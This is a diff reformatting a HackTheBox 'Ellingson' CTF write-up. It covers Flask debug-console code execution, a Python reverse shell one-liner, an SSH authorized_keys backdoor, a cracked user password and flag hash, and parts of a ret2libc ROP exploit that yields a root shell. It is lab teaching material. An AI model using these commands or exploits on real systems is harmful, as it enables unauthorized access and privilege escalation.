@@ -2,37 +2,34 @@
 sticker: emoji//1f64a
 ---
 
+# ELLINGSON
 
-# ENUMERATION
----
+## ENUMERATION
 
+***
 
+### OPEN PORTS
 
-## OPEN PORTS
----
-
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 22   | SSH     |
 | 80   | HTTP    |
 
+## RECONNAISSANCE
 
+***
 
-# RECONNAISSANCE
----
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428155349.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428155349.png)
 
 We got three articles on here, let's check them out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428155431.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428155431.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428155440.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428155440.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428155449.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428155449.png)
 
 Articles talk about some security incidents, nothing to helpful from them, but, if we check the URL format, we can notice this:
 
@@ -54,17 +51,17 @@ If we check:
 
 We can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428160732.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428160732.png)
 
 We got some errors regarding `flask`, let's proceed to exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 If we hover in any of the error lines, we can see a console which let's us open an python shell, we can write a simple print and check the behavior:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428161000.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428161000.png)
 
 Nice, we can try some python payloads to check if we can get info on the system:
 
@@ -73,7 +70,7 @@ import os
 print(os.popen("whoami").read())
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428161117.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428161117.png)
 
 We are running this as `hal`, let's get a reverse shell using the following command:
 
@@ -83,7 +80,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 
 In our listener, we can see the connection:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428161506.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428161506.png)
 
 Let's stabilize our shell and look around:
 
@@ -97,11 +94,9 @@ export TERM=xterm
 export BASH=bash
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428161606.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428161606.png)
 
 Inside of `/home/hal/.ssh`, we can find an `id_rsa` key:
-
 
 ```
 hal@ellingson:~$ ls -la .ssh
@@ -115,7 +110,7 @@ drwxrwx--- 5 hal hal 4096 Jul 16  2021 ..
 
 Let's get it on our machine and try logging into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428161815.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428161815.png)
 
 We need a passphrase, tried using john but there was no luck, still, we can do the following to get access to ssh:
 
@@ -131,24 +126,23 @@ ssh-keygen -t rsa
 echo "OUR_ID_RSA.PUB CONTENTS" >> /home/hal/.ssh/authorized_keys
 ```
 
-
 3. Log into ssh using our key:
 
 ```
 ssh hal@10.10.10.139 -i id_rsa
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428162354.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428162354.png)
 
 There we go, let's begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
+***
 
 Since we already got a shell as hal, we can use `linpeas` to check any PE vector:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428162715.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428162715.png)
 
 We got a `shadow.bak` on `/var/backups`, let's check it out:
 
@@ -225,7 +219,7 @@ This is the password for `margo`:
 margo:iamgod$08
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428164428.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428164428.png)
 
 ```
 margo@ellingson:~$ cat user.txt
@@ -234,7 +228,7 @@ cbfeb02c5d13aeffcfe1fc3cd2ec37e6
 
 Let's run `linpeas` again:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428164835.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428164835.png)
 
 We got an unknown binary named `garbage`, let's take a look:
 
@@ -414,7 +408,7 @@ The tankers have stopped capsizing
 > 4
 ```
 
-Nothing weird on here, the weird stuff comes on the `Enter access password`, if we analyze the strings, we can notice that `strcpy` and `strcat` appear in the strings. These functions do **not check buffer sizes**, making them prime candidates for buffer overflows. Let's try to check if the buffer overflow exists:
+Nothing weird on here, the weird stuff comes on the `Enter access password`, if we analyze the strings, we can notice that `strcpy` and `strcat` appear in the strings. These functions do **not check buffer sizes**, making them prime candidates for buffer overflows. Let's try to check if the buffer overflow exists:
 
 ```bash
 margo@ellingson:~$ /usr/bin/garbage
@@ -429,7 +423,6 @@ There we go, we got `Segmentation fault (core dumped)` this let's us know this i
 ```
 scp margo@10.10.10.139:/usr/bin/garbage .
 ```
-
 
 We can check if `ASLR` is on here:
 
@@ -606,7 +599,6 @@ python3 libc_base.py
 [*] Closed connection to '10.10.10.139'
 ```
 
-
 There we go, we got the base address, we can construct another script which gives us a shell:
 
 ```python
@@ -673,7 +665,7 @@ log.info("Calculated libc address: " + hex(libc.address))
 shell(p, elf, libc, rop)
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428173601.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428173601.png)
 
 But the thing is we are still margo, in order to get a shell as root, we need to exploit another stuff, we need to make use of `setuid()` to set our `uid` to `0` which is the root user uid, let's change the script again:
 
@@ -758,7 +750,7 @@ shell(p, elf, libc, rop)
 
 If we use the script:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428174703.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428174703.png)
 
 We got a root shell and can finally read the root flag to end the CTF:
 
@@ -768,5 +760,3 @@ We got a root shell and can finally read the root flag to end the CTF:
 ```
 
 https://www.hackthebox.com/achievement/machine/1872557/189
-
-
